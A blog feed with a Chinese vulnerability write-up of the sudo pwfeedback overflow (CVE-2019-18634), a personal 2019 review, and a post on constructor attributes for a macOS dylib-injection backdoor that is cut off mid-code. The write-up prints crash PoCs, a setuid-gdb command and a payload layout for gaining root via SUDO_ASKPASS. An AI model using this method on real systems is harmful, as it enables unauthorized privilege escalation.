        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>Sudo’s <em>pwfeedback</em> option can be used to provide visual feedback when the user is inputting their password. For each key press, an asterisk is printed. This option was added in response to user confusion over how the standard <code>Password:</code> prompt disables the echoing of key presses. While <em>pwfeedback</em> is not enabled by default in the upstream version of sudo, some systems, such as Linux Mint and Elementary OS, do enable it in their default sudoers files.</p><p>Due to a bug, when the <em>pwfeedback</em> option is enabled in the sudoers file, a user may be able to trigger a stack-based buffer overflow. This bug can be triggered even by users not listed in the sudoers file. There is <strong>no</strong> impact unless <em>pwfeedback</em> has been enabled.</p></blockquote><p>可以知道的信息是：</p><ol><li>漏洞存在的情形时在开启 <strong>pwfeedback</strong> 的前提下</li></ol><p>开启方法 <code>echo Defaults pwfeedback &gt;&gt; /etc/sudoers</code><br>2. 影响版本  1.8.26-1.8.30<br>3. CVE 上写的 stack-based buffer overflow 是有误的，我们后面会提到</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>在 openwall 和 sudo 官网上都能看到连接在下面</p><p><a href="https://www.openwall.com/lists/oss-security/2020/02/05/2">CVE-2019-18634: buffer overflow in sudo when pwfeedback is enabled</a></p><p><a href="https://www.sudo.ws/alerts/pwfeedback.html">Buffer overflow when pwfeedback is set in sudoers </a></p><p><strong>PoC 1</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ socat pty,link&#x3D;&#x2F;tmp&#x2F;pty,waitslave exec:&quot;perl -e &#39;print((\&quot;A\&quot; x 100 . chr(0x15)) x 50)&#39;&quot; &amp;</span><br><span class="line"> $ sudo -S -k id &lt; &#x2F;tmp&#x2F;pty</span><br><span class="line"> Password: Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure><p><strong>PoC2</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e &#39;print((&quot;A&quot; x 100 . chr(0)) x 50)&#39; | sudo -S -k id</span><br><span class="line">Password: Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure><p>PoC1 是通过 pty 程序传 payload  ，PoC2 是通过终端，另外可以看到 一个结尾为 <code>chr(0x15)</code> 一个结尾是 <code>chr(0)</code>, 这是根据不同的传入方式区分的。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="寻找漏洞点"><a href="#寻找漏洞点" class="headerlink" title="寻找漏洞点"></a>寻找漏洞点</h3><p>我的环境是 ubuntu18.04 然后我编译了一份 sudo 1.8.21p2 的源码，方便用来调试</p><p>为了方便，我一开始用的是 PoC2：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">swing@ubuntu:~/Desktop/sudo/sudo-1.8.21p2/src/.libs$ gdb -q ./sudo</span><br><span class="line">Reading symbols from ./sudo...done.</span><br><span class="line">gdb-peda$ r -S id &lt; /tmp/poc2</span><br><span class="line">Starting program: /home/swing/Desktop/sudo/sudo-1.8.21p2/src/.libs/sudo -S id &lt; /tmp/poc2</span><br><span class="line">sudo: effective uid is not 0, is /home/swing/Desktop/sudo/sudo-1.8.21p2/src/.libs/sudo on a file system with the <span class="string">&#x27;nosuid&#x27;</span> option <span class="built_in">set</span> or an NFS file system without root privileges?</span><br><span class="line">[Inferior 1 (process 14799) exited with code 01]</span><br></pre></td></tr></table></figure><p>第一次挂载 gdb 的时候会发现 权限不够，但是如果权限是 root sudo又失去了意义，所以我给 gdb 挂上了和 sudo 一样的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown root:root /usr/bin/gdb &amp;&amp; chmod 4755 /usr/bin/gdb</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207191157.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207191157.png"></a></p><p>然后在调试，就基本确定了主要漏洞的存在，在 tgetpass.c:178 getln函数里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (timeout &gt; <span class="number">0</span>)</span><br><span class="line">alarm(timeout);</span><br><span class="line">   pass = getln(input, buf, <span class="keyword">sizeof</span>(buf), ISSET(flags, TGP_MASK));</span><br><span class="line">   alarm(<span class="number">0</span>);</span><br><span class="line">   save_errno = errno;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (neednl || pass == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (write(output, <span class="string">&quot;\n&quot;</span>, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">goto</span> restore;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>而且, 由于 buf 是static const 位于bss上，所以并不是 什么栈溢出，而是 bss 溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *</span><br><span class="line">tgetpass(<span class="keyword">const</span> <span class="keyword">char</span> *prompt, <span class="keyword">int</span> timeout, <span class="keyword">int</span> flags,</span><br><span class="line">    struct sudo_conv_callback *callback)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sa</span>, <span class="title">savealrm</span>, <span class="title">saveint</span>, <span class="title">savehup</span>, <span class="title">savequit</span>, <span class="title">saveterm</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">savetstp</span>, <span class="title">savettin</span>, <span class="title">savettou</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *pass;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *askpass;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buf[SUDO_CONV_REPL_MAX + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">int</span> i, input, output, save_errno, neednl = <span class="number">0</span>, need_restart;</span><br><span class="line">    debug_decl(tgetpass, SUDO_DEBUG_CONV)</span><br></pre></td></tr></table></figure><p>这个时候，如果我们用 ida 看，能看到他总共覆盖了哪些变量</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207191603.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207191603.png" style="zoom:50%;" /></a><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>我们找到了一些能覆盖的内容，那么我紧接着要找到哪些是可利用的, 中间 user_details 这个结构体的内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p user_details</span><br><span class="line">$2 &#x3D; &#123;</span><br><span class="line">  pid &#x3D; 0x41414141,</span><br><span class="line">  ppid &#x3D; 0x41414141,</span><br><span class="line">  pgid &#x3D; 0x41414141,</span><br><span class="line">  tcpgid &#x3D; 0x41414141,</span><br><span class="line">  sid &#x3D; 0x41414141,</span><br><span class="line">  uid &#x3D; 0x41414141,</span><br><span class="line">  euid &#x3D; 0x41414141,</span><br><span class="line">  gid &#x3D; 0x41414141,</span><br><span class="line">  egid &#x3D; 0x41414141,</span><br><span class="line">  username &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  cwd &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  tty &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  host &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  shell &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  groups &#x3D; 0x4141414141414141,</span><br><span class="line">  ngroups &#x3D; 0x41414141,</span><br><span class="line">  ts_cols &#x3D; 0x41414141,</span><br><span class="line">  ts_lines &#x3D; 0x41414141</span><br><span class="line">&#125;</span><br><span class="line">gdb</span><br></pre></td></tr></table></figure><p>这个时候，我们就会想如果我们把 uid 覆盖成0 会怎么样？另外在看代码的过程中一段代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tgetpass.c 276</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Fork a child and exec sudo-askpass to get the password from the user.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *</span><br><span class="line">sudo_askpass(<span class="keyword">const</span> <span class="keyword">char</span> *askpass, <span class="keyword">const</span> <span class="keyword">char</span> *prompt)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buf[SUDO_CONV_REPL_MAX + <span class="number">1</span>], *pass;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sa</span>, <span class="title">savechld</span>;</span></span><br><span class="line">    <span class="keyword">int</span> pfd[<span class="number">2</span>], status;</span><br><span class="line">    <span class="keyword">pid_t</span> child;</span><br><span class="line">    debug_decl(sudo_askpass, SUDO_DEBUG_CONV)</span><br><span class="line">      ....</span><br><span class="line">      ....</span><br><span class="line">closefrom(STDERR_FILENO + <span class="number">1</span>);</span><br><span class="line">execl(askpass, askpass, prompt, (<span class="keyword">char</span> *)<span class="literal">NULL</span>);</span><br><span class="line">sudo_warn(U_(<span class="string">&quot;unable to run %s&quot;</span>), askpass);</span><br><span class="line">_exit(<span class="number">255</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里 execl 的参数 askpass 是前面被覆盖的变量之一，感觉后面会用到。然后在调试的过程中，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tgetpass.c 211</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NSIG; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (signo[i]) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (i) &#123;</span><br><span class="line"><span class="keyword">case</span> SIGTSTP: <span class="comment">// 18</span></span><br><span class="line"><span class="keyword">case</span> SIGTTIN: <span class="comment">// 21</span></span><br><span class="line"><span class="keyword">case</span> SIGTTOU: <span class="comment">// 22</span></span><br><span class="line">    <span class="keyword">if</span> (suspend(i, callback) == <span class="number">0</span>)</span><br><span class="line">need_restart = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    kill(getpid(), i);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>卡在了 这里，signo 也是我们覆盖的变量之一，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;30x &amp;signo</span><br><span class="line">0x5583b72413e0 &lt;signo&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b72413f0 &lt;signo+16&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241400 &lt;signo+32&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241410 &lt;signo+48&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241420 &lt;signo+64&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241430 &lt;signo+80&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241440 &lt;signo+96&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241450 &lt;signo+112&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241460 &lt;signo+128&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241470 &lt;signo+144&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241480 &lt;signo+160&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241490 &lt;signo+176&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b72414a0 &lt;signo+192&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b72414b0 &lt;signo+208&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b72414c0 &lt;signo+224&gt;:0x41414141414141410x4141414141414141</span><br></pre></td></tr></table></figure><p>此时， signo 被覆盖成了 0x41414141 * N ，从代码逻辑看，我们得为空才能避免被 kill 掉，但由于我们的 此时的 PoC2 是以 <code>chr(0)</code> 作结尾的，所以 signo 此时必不能为 <code>\x00</code>, 那么此时我们只能换成 PoC1 去调试。紧接着另外一个问题又来了，由于 PoC1 是 pty 形式的，所以我们得做以下顺序</p><ol><li>运行 gdb</li><li>挂载调试器</li><li>然后才是 socat 命令</li></ol><p>不然 可能你刚挂载上去 程序就 crash 掉了</p><p>我这里用了一个更蠢的方法，就是 通过 gdb 强行 set 关键的数据，这样虽然慢了一点，但避免了我接着去解决 gdb 调试sudo 的问题</p><p>所以到此时，思路就是除了 user_details 的内容，其他我们先默认覆盖为 0 ，则 payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x00\x15&quot; * buf_size + &quot;\x00\x15&quot; * signo_sz + &quot;\x00&quot; * tgetpass_flags + &quot;\x00&quot; *24+ user_details + ...</span><br></pre></td></tr></table></figure><p>但是，这里又会出现一个问题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">swing@ubuntu:~/Desktop/sudo/exploit$ ./exploit.sh</span><br><span class="line">[sudo] password <span class="keyword">for</span> swing:</span><br><span class="line">Sorry, try again.</span><br><span class="line">sudo: no tty present and no askpass program specified</span><br><span class="line">sudo: 1 incorrect password attempt</span><br><span class="line">Exploiting!</span><br></pre></td></tr></table></figure><p>然后翻代码的时候，猜测是 <strong>tgetpass_flag</strong> 有问题，不能是 “\x00\x00\x00\x00” ,因为我们最后可能要用到 sudo_askpassh 这个函数，</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207203009.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207203009.png" style="zoom:50%;" /></a><p>在代码里和 sudo_askpassh 有关的字样好像是 TGP_ASKPAS ,看到有关宏定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Flags for tgetpass()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_NOECHO0x00<span class="comment">/* turn echo off reading pw (default) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_ECHO0x01<span class="comment">/* leave echo on when reading passwd */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_STDIN0x02<span class="comment">/* read from stdin, not /dev/tty */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_ASKPASS0x04<span class="comment">/* read from askpass helper program */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_MASK0x08<span class="comment">/* mask user input when reading */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_NOECHO_TRY0x10<span class="comment">/* turn off echo if possible */</span></span></span><br></pre></td></tr></table></figure><p>那大概就是 0x4了 所以这里设置为 “\x04\x00\x00\x00”，那剩下的 <strong>user_details</strong> 结构体怎么办？ 最简单的办法就抄一个，然后将 uid 字段设置为 0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_details &#x3D; &quot;\x53\x87\x00\x00\x47\x87\x00\x00\x53\x87\x00\x00\x53\x87\x00\x00\x76\x3d\x00\x00\x00\x00\x00\x00&quot;</span><br></pre></td></tr></table></figure><p>上面是我从 gdb 直接手抄的，并将 uid 设置为0</p><p>最后 加上足够长的 结束符 和 “\n” 就完成了整个 exploit ，另外 由于我们要提权，所以得事前写好一个 shell , set uid 并执行一个shell。</p><p>且在执行 exploit的时候要设置 SUDO_ASKPASS 环境变量为执行程序路径</p><h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><p><a href="https://asciinema.org/a/1zYzaSHoQLF3RZOcYjCN1xWCE"><a href="https://asciinema.org/a/1zYzaSHoQLF3RZOcYjCN1xWCE.svg" title="asciicast" class="gallery-item"><img src="https://asciinema.org/a/1zYzaSHoQLF3RZOcYjCN1xWCE.svg" alt="asciicast"></a></a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.openwall.com/lists/oss-security/2020/02/05/2">CVE-2019-18634: buffer overflow in sudo when pwfeedback is enabled</a></p><p><a href="https://www.sudo.ws/alerts/pwfeedback.html">Buffer overflow when pwfeedback is set in sudoers </a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2019-18634 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Goodbye 2019,Hello 2020!</title>
      <link href="Goodbye_2019,Hello_2020!.html"/>
      <url>Goodbye_2019,Hello_2020!.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="Goodbye-2019"><a href="#Goodbye-2019" class="headerlink" title="Goodbye 2019"></a>Goodbye 2019</h2><p>2019 年，从学生到安全研究员… 经历了一阵子的茫然，但是也逐渐找到了自己的方向.</p><h3 id="1月"><a href="#1月" class="headerlink" title="1月"></a>1月</h3><p>在华为进行代码审计，第一次接触通讯领域的一些相关协议，以及相关协议代码实现。主要是3GPP<br> 3G 、4G、5G 等相关的内容</p><h3 id="2月"><a href="#2月" class="headerlink" title="2月"></a>2月</h3><p>春节假期回家，已经感觉好久没回家了，今年这个时候整理了 2018 自己的经历。</p><ul><li>去了海边</li><li>去了以前的高中</li></ul><p>假期结束，又回了华为，接着审代码 Orz</p><h3 id="3月"><a href="#3月" class="headerlink" title="3月"></a>3月</h3><ul><li>回公司搞了一些 IoT 设备，路由、摄像头都有</li><li>3月23日和婴宁去看了音乐会，讲道理我真听不懂 Orz</li><li>中间搞了一段时间一些 VPN 设备</li></ul><h3 id="4月"><a href="#4月" class="headerlink" title="4月"></a>4月</h3><p>4月份，这个时候准备回学校安心做毕业设计了…花了大概一个月时间完成了自己的毕设…主要还是数据处理，Python 对简化我的工作起到了很大的作用</p><h3 id="5月"><a href="#5月" class="headerlink" title="5月"></a>5月</h3><p>5月份的时候，毕设基本完成了，论文也基本成稿。</p><p>中旬的时候，去了 TW 当毕业旅行了…</p><ul><li>逛了台北，然后去了花莲，玩了滑翔伞</li><li>然后又回到台北，去了台北101，逛了台北的书店，买了一本书：《一九四⑨ 大江大海》</li></ul><p>逛完台北，5月底回学校拍了学院毕业照，距离毕业更近了</p><h3 id="6月"><a href="#6月" class="headerlink" title="6月"></a>6月</h3><p>6月初的时候，r3kapig 承办了”B”CTF DEFCON CHINA …被拉去了北京当运维</p><p>回了学校，班级也拍了自己的毕业照，这大概是大家最后的一次合照了</p><p>6月9号..去了上海 冲刺DEFCON Final的最后一张门票 — 0CTF Final。最后10分钟的时候连出两个题，绝杀Balsn，ne0 tql (不好意思..”我们有400人呢！“)</p><p>6月27日，生日 + 班级的告别聚餐，这一天也正式认识了我现在的女朋友…6月29日，我大概是我们班最后离开了宿舍，离开了学校的人吧..离开的时候，拍了不少照片</p><p>中间进行了GeekPwn 华为专场备赛</p><h3 id="7月"><a href="#7月" class="headerlink" title="7月"></a>7月</h3><p>7月5号 chaitin 5周年年会，哈哈 ，只中了个三件套</p><p>7月6号 360 世界黑客大师赛，我年会结束后打车去了酒店帮忙做题…最后拿了个第三</p><p>7月20日 ，蹭了个看雪论坛</p><p>7月24日，去了上海 打了前面六月份准备完成的GeekPwn 华为专场，论“从一个参数注入到命令执行”</p><h3 id="8月"><a href="#8月" class="headerlink" title="8月"></a>8月</h3><p>蹭了个 “靠谱黑客音乐节”的票，周末去玩了下。顺便一说，我的美国签证挂了..</p><p>r3kpaig DEFCON 27 CTF Final 11…</p><p>8月24日,Kcon 遇到了好久没见的 lowkey</p><p>8月25日，五月天 2019 Just Rock It ！！！ Blue 北京站，第一次去看演唱会。中间还支撑了ogeek的线上比赛，听演唱会听到一半，听到题目回滚的时候，sandbox炸了 …哭了</p><p>8月29日，去长春出差，顺便和小墨、医生面基</p><h3 id="9月"><a href="#9月" class="headerlink" title="9月"></a>9月</h3><p>Ogeek结束，筹备 RWCTF Online ,但是我题由于某些原因，被干了，出题失败..于是和@leommxj 准备GeekPwn 2014 上海站的项目，我们这次选定了，公司的投影设备，准备做个蠕虫链。</p><p>搞到一半，公司又接了个代码审计的活，这次是去了南京华为。只好中间剩下的东西由@explorer 和@leommxj完成。</p><h3 id="10月"><a href="#10月" class="headerlink" title="10月"></a>10月</h3><p>国庆7天和女朋友在南京度过..</p><ul><li><p>夫子庙</p></li><li><p>秦淮河</p></li><li><p>中山陵</p></li><li><p>南京博物馆</p></li><li><p>雨花台</p><p>…..</p></li></ul><p>10月24日 去了上海参加GeekPwn ,挑战十分顺利，比赛结束后，顺便回北京取了冬天的衣服，顺便一说，秋天的768蛮好看</p><h3 id="11月"><a href="#11月" class="headerlink" title="11月"></a>11月</h3><p>仍然在南京华为审计代码…</p><p>11月中旬的某个周末去看女朋友了</p><p>11月23号后，项目结束，回北京筹备 RWCTF Final 的题目，方向是打印机…我们决定从 IPP 入手，选择了 cupsd 的代码</p><p>wp见：<a href="https://github.com/bash-c/rwctf2019-final-printer">https://github.com/bash-c/rwctf2019-final-printer</a></p><p>11月30日，北京下雪了 </p><h3 id="12月"><a href="#12月" class="headerlink" title="12月"></a>12月</h3><p>12月6日，RWCTF Final 开启，去年是选手，今年是工作人员，有点唏嘘。</p><p>RWCTF 结束后，突然捡到了小米打印机的一个洞，拿到了第一个shell，之后又有了一点产出..233</p><p>12月28日，和女朋友去天津玩了两天，坐了天津之眼</p><h2 id="Hello-2020"><a href="#Hello-2020" class="headerlink" title="Hello 2020"></a>Hello 2020</h2><p>“只争朝夕，不负韶华”</p><p>希望能有更多的产出吧 </p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译属性 &quot;__attribute__&quot; 的一些简单认识</title>
      <link href="Compile_attribute_properties.html"/>
      <url>Compile_attribute_properties.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前端时间，在打geekpwn的时候，需要做后门，一开始我做的是macos的后门，用的是 macos dylib注入（劫持？）。</p><p>这里可以提一下，我这里用的是这个项目<a href="https://github.com/Tyilo/insert_dylib">insert_dylib</a>，曾经看过有人用这个项目，去掉了macos上企业微信的水印，所以一直有点印象。</p><p>使用方式如下：insert @executable_path src dst</p><p>最后能类似这样的一个效果：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191123215413.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191123215413.png"></a></p><p>红色框的，是我注入的dylib 程序，那么另外一个问题来了，如何让在程序启动前或者后，执行外面的代码呢？这里就是这个文章想提的一个东西。</p><blockquote><p>什么是 @executable_path ？</p><p> executable_path 是macOS的链接路径的解决方案之一，除此之外还有 @loader_path 和 @rpath，具体细节不在这里表述，感兴趣可以自己搜一下。</p></blockquote><h2 id="attribute"><a href="#attribute" class="headerlink" title="attribute"></a><strong>attribute</strong></h2><h3 id="认识"><a href="#认识" class="headerlink" title="认识"></a>认识</h3><p>首先，什么是 <strong><strong>attribute</strong></strong> ？ </p><p><code>__attribute__</code>是一个编译属性，用于向编译器描述特殊的标识、错误检查或高级优化。它是GNU C特色之一，系统中有许多地方使用到。 <code>__attribute__</code>可以设置函数属性（Function Attribute ）、变量属性（Variable Attribute ）和类型属性（Type Attribute)等。</p><p>接着如何利用该编译属性达到我们想要的效果？</p><p>这里我们要认识两个编译属性</p><ol><li><strong>attribute</strong>((constructor))</li><li><strong>attribute</strong>((destructor))</li></ol><p>这两个带着  <code>__attribute__</code> 编译属性的标识并不相同，一个是constructor 一个是 destructor。</p><p>从字面上理解 constructor 是构造器的意思，destructor 是 a refuse-burning furnace（焚化炉的意思？），我们可以简单的理解其为c++ 函数里的构造函数和析构函数，其特点就是在于：</p><p><strong>attribute</strong>((constructor)) 确保此函数在 在<code>main</code>函数被调用之前调用，iOS中在<code>+load</code>之后<code>main</code>之前执行。<br> <code>constructor</code>和<code>destructor</code>会在<code>ELF</code>文件中添加两个段-<code>.ctors</code>和<code>.dtors</code>。当动态库或程序在加载时，会检查是否存在这两个段，如果存在执行对应的代码。</p><p><strong>attribute</strong>((destructor))，确保此函数在 在<code>main</code>函数被调用之后调。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>我这里可以放一个，当时macos后面的一个例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="meta-string">&quot;shellme.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span 